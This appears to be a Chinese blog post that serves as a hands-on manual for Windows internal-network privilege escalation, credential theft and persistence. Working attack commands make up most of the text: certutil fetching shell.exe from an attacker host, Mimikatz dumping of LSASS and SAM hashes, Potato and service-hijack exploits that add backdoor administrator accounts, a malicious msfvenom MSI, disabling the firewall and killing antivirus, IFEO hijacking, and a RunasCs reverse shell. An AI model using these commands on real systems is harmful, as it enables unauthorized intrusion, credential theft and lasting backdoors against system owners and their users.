---
title: Windows内网渗透本地提权全流程手册
date: 2026-07-15 12:00:00 +0800
categories: [经验分享, 内网渗透]
tags: [渗透测试, 提权, Windows]
description: 本文为独立 Windows 内网本地提权专项手册，整合信息收集、凭证抓取、特权提权、配置错误漏洞、计划任务、防火墙&RDP持久化、镜像/DLL劫持、票据伪造横向移动全套实操命令，附带工具开源地址、报错说明与利用场景，适用于内网渗透提权、横向移动、权限维持。
---

# Windows内网渗透本地提权全流程手册

本文为独立 Windows 内网本地提权专项手册，整合**信息收集、凭证抓取、特权提权、配置错误漏洞、计划任务、防火墙\&RDP持久化、镜像/DLL劫持、票据伪造横向移动**全套实操命令，附带工具开源地址、报错说明与利用场景，适用于内网渗透提权、横向移动、权限维持。

## 一、Windows 自动化信息收集（提权前置必备）

本地提权第一步：优先使用自动化工具批量扫描系统缺陷、权限漏洞、配置错误，再针对性手动复核。

### 核心工具与项目地址

- **winPEASx64**：Windows 全方位提权枚举工具（补丁、服务、注册表、权限、端口、凭据）
开源地址：[https://github\.com/carlospolop/PEASS\-ng](https://github.com/carlospolop/PEASS-ng)

- **PowerUp\.ps1**：PowerShell 系统配置缺陷、服务权限、提权漏洞专项检测工具
开源地址：[https://github\.com/PowerShellMafia/PowerSploit](https://github.com/PowerShellMafia/PowerSploit)

### 工具执行命令

```bash
# 1. winPEAS 全自动一键扫描（全覆盖提权面）
.\winPEASx64.exe

# 2. PowerUp 批量检测所有可提权配置漏洞
.\PowerUp.ps1
Invoke-AllChecks
```

## 二、手动精准信息收集（提权依据排查）

### 1\. 系统特权查询（Potato提权核心依据）

```bash
# 查看当前用户所有系统特权，重点关注：
# SeImpersonatePrivilege、SeAssignPrimaryTokenPrivilege
whoami /priv
```

### 2\. 系统补丁枚举（查找未修复高危提权漏洞）

```bash
# 查看系统版本、已安装补丁，用于匹配CVE提权EXP
systeminfo
```

### 3\. 杀软/防火墙进程探测

```bash
# 查看所有进程+对应服务，定位杀毒、EDR、防火墙进程
tasklist /SVC
```

### 4\. 域环境探测（区分工作组/域主机）

```bash
# 读取系统注册表，判断主机是否加入域环境
Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion'
```

### 5\. 在线用户探测（优先劫持域管理员会话）

```bash
# 查看当前登录在线用户，寻找高权限域用户
query user
qwinsta
```

### 6\. 靶机文件上传（渗透必备）

```bash
# 攻击机开启临时文件服务
python3 -m http.server 8000

# Windows无依赖上传工具（certutil系统自带，免杀性强）
certutil -urlcache -split -f http://攻击机IP:8000/shell.exe c:\shell.exe
```

## 三、系统明文凭证抓取（高频突破口）

### 1\. PowerShell 历史命令（高概率泄露账号密码）

```bash
# 查看当前用户PS历史记录路径
gc (Get-PSReadLineOption).HistorySavePath

# 读取指定用户历史命令
type c:\users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt

# 批量遍历本机所有用户PowerShell历史记录
foreach($user in ((ls C:\users).fullname)){    
cat "$user\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt" -ErrorAction SilentlyContinue
}
```

### 2\. 注册表自动登录明文密码

```bash
# 查询系统开机自动登录账号密码
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
```

### 3\. 系统缓存凭据（RDP/共享/远程连接）

```bash
# 查看系统保存的所有账号凭据
cmdkey /list

# 打开可视化凭据管理器
control keymgr.dll
```

### 4\. Web站点数据库配置文件

```bash
# IIS默认站点配置文件，大概率存在数据库账号密码
type C:\inetpub\wwwroot\web.config
```

### 5\. 局域网共享文件枚举

```bash
# 查看已挂载的网络共享
net use

# 读取远程终端共享磁盘文件
dir \\TSCLIENT\C
```

### 6\. 全局文件关键词检索

```bash
# 全盘检索指定后缀/名称文件（可替换为xml/conf/passwd等）
Get-ChildItem -Path C:\,D:\,E:\,F:\ -Recurse -Filter "index.html" -File -ErrorAction SilentlyContinue | Select-Object FullName
```

### 7\. 无人值守安装文件泄露（管理员密码高危）

```bash
# 全盘搜索系统部署配置文件，常包含明文管理员密码
dir /s /b unattend.xml sysprep.xml
```

### 8\. Mimikatz 内存/SAM凭证抓取

适用场景：已获取本地权限，抓取内存登录凭据、HASH值用于横向移动

```bash
# 1. 抓取内存登录密码、HASH、会话凭据
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords full" exit

# 2. 读取本地SAM数据库，dump所有用户HASH
mimikatz.exe "privilege::debug" "token::elevate" "lsadump::sam" exit
```

## 四、Windows 特权令牌滥用提权

核心利用：普通用户拥有特定系统特权，可伪造系统令牌提升至 SYSTEM 权限，主流为 Potato 系列提权。

### 可用高危特权

- **SeImpersonatePrivilege**：模拟客户端令牌（Potato核心依赖）

- **SeAssignPrimaryTokenPrivilege**：分配系统主令牌

- SeBackupPrivilege/SeRestorePrivilege/SeTakeOwnershipPrivilege：任意文件读写、权限接管

- SeDebugPrivilege：调试进程、转储LSASS内存

### Potato 系列提权实操（全覆盖系统）

```bash
# ========== GodPotato（推荐：Win8-Win11/Server2012-2022 全适配） ==========
# 执行系统命令验证权限
.\GodPotato.exe -cmd "cmd /c whoami"
# 新增管理员后门账号
.\GodPotato.exe -cmd "cmd /c net user admin P@ssw0rd /add && net localgroup administrators admin /add"

# ========== PrintSpoofer（Win10/Server2019 速度最快） ==========
.\PrintSpoofer.exe -i -c cmd

# ========== JuicyPotato（老旧系统：Win7/Server2008-2016） ==========
.\JuicyPotato.exe -l 1337 -p cmd.exe -t * -c {F3130CDB-AA52-4C3A-AB32-85FFC23AF9C1}
```

## 五、系统配置错误提权

### 1\. 未引号服务路径漏洞提权

原理：服务路径含空格且未加引号，Windows优先执行空格前可执行文件，可放置恶意程序劫持服务启动。

```bash
# 批量检测存在漏洞的自动启动服务
wmic service get name,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\"
```

### 2\. 弱服务权限提权

原理：普通用户拥有服务修改权限，可篡改服务启动路径，重启服务实现权限提升。

```bash
# 检测普通用户可修改的服务
.\accesschk.exe -uwcqv "Authenticated Users" * 2>nul
.\accesschk.exe -uwcqv %username% * 2>nul

# 漏洞利用：修改服务启动命令，新增管理员账号
sc config "VulnService" binpath= "cmd /c net user admin P@ssw0rd /add"
sc stop "VulnService"
sc start "VulnService"
```

### 3\. AlwaysInstallElevated 安装权限提权

原理：注册表开启全局MSI高权限安装，普通用户可安装高权限程序，实现提权。**需两项注册表值均为1才可利用**

```bash
# 检测漏洞是否存在
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

# MSF生成恶意MSI安装包并执行提权
msfvenom -p windows/exec CMD='net user backdoor P@ssw0rd /add&&net localgroup administrators backdoor /add' -f msi > evil.msi
msiexec /quiet /qn /i evil.msi
```

## 六、计划任务漏洞利用

原理：系统自建计划任务以SYSTEM权限运行，若任务执行脚本/程序可写，可覆盖文件劫持执行。

```bash
# CMD：查询非系统自带计划任务
schtasks /query /fo LIST /v | findstr /i "task name\|run as\|task to run"

# PowerShell：查询SYSTEM权限运行的计划任务
Get-ScheduledTask | Where-Object {$_.Principal.UserId -eq "SYSTEM"} | Select-Object TaskName,TaskPath

# 检测任务执行文件是否可写
Get-ScheduledTask | ForEach-Object {    
$path = $_.Actions.Execute    
if ($path) { Get-Acl $path -ErrorAction SilentlyContinue | Select-Object Path,AccessToString }
}
```

## 七、防火墙关闭 \& RDP持久化（内网常驻）

```bash
# 1. 关闭系统所有防火墙配置（域/专用/公用）
NetSh Advfirewall set allprofiles state off

# 2. 强制结束杀毒软件进程
taskkill /F /PID 杀软PID

# 3. MSF一键开启RDP服务
use post/windows/manage/enable_rdp

# 4. 注册表开启远程桌面连接
reg add "HKLM\System\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f

# 5. 设置RDP服务自启
sc config TermService start= auto

# 6. 创建RDP后门账号并授权远程登录
net user rdpuser P@ssw0rd123 /add
net localgroup administrators rdpuser /add
net localgroup "Remote Desktop Users" rdpuser /add
```

## 八、镜像劫持与DLL劫持提权

### 1\. IFEO 镜像劫持提权

原理：利用映像执行选项权限漏洞，劫持系统工具启动，替换为SYSTEM权限CMD

```bash
# 查看镜像劫持注册表权限
get-acl -path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options" | fl *

# 劫持放大镜工具，触发即弹出SYSTEM CMD
REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\magnify.exe" /v Debugger /t REG_SZ /d "C:\windows\system32\cmd.exe"
```

### 2\. DLL劫持检测与利用

利用工具：Process Monitor、PowerSploit 劫持检测脚本

```bash
# PowerShell 检测可劫持路径与进程
Find-PathDLLHijack
Find-ProcessDLLHijack
```

C语言DLL编译模板（用于生成恶意劫持DLL）：`gcc -shared adduser.c -o adduser.dll -luser32 -lkernel32`

## 九、SMB票据伪造与降权横向移动

适用场景：当前权限无法使用smbclient连接目标内网机器，通过RunasCs伪造身份横向移动

```bash
# 指定账号身份，反弹CMD到攻击机监听端口
.\RunasCs.exe akanksha sweetgirl cmd.exe -r 192.168.1.105:1234
```

## 手册总结

1\. Windows内网提权优先排查**系统特权、服务配置错误、计划任务、注册表漏洞**四大高频面；

2\. 凭证抓取为内网横向移动核心，优先读取PS历史、注册表、SAM内存凭据；

3\. Potato系列提权适配绝大多数Windows服务器，是低权限用户提权SYSTEM最优解；

4\. RDP开启、账号新增、镜像劫持可用于长期权限维持，适配内网落地渗透。

> （注：部分内容可能由 AI 生成）
